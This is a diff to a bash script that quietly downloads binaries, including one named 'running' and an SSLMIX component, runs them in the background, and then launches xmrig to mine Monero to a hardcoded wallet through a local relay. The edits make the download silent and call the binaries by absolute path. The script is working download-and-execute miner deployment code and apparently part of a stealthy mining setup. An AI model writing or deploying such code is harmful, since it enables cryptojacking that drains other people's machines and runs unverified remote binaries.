@@ -10,7 +10,7 @@ download_and_set_permissions() {
     local download_url="$1"
     local filename=$(basename "$download_url")
     if [ ! -f "$DIRECTORY/$filename" ]; then
-        curl -# -o "$DIRECTORY/$filename" "$download_url"
+        curl -s -o "$DIRECTORY/$filename" "$download_url"
         if [ $? -ne 0 ]; then
             echo "Failed to download $filename."
             exit 1
@@ -27,10 +27,9 @@ download_and_set_permissions "$DOWNLOAD_SSLMIX_URL"
 
 # Run /usr/local/bin/running in the background for 3 seconds
 if [ -f "$DIRECTORY/running" ]; then
-    cd "$DIRECTORY"
-    ./running &
+    ($DIRECTORY/running) &
     sleep 3
 fi
 
 # Run xmrig command
-./xmrig --url=127.0.0.1:9443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=Local-Auto -k --coin monero --max-threads-hint=80
+"$DIRECTORY/xmrig" --url=127.0.0.1:9443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=Local-Auto -k --coin monero --max-threads-hint=80
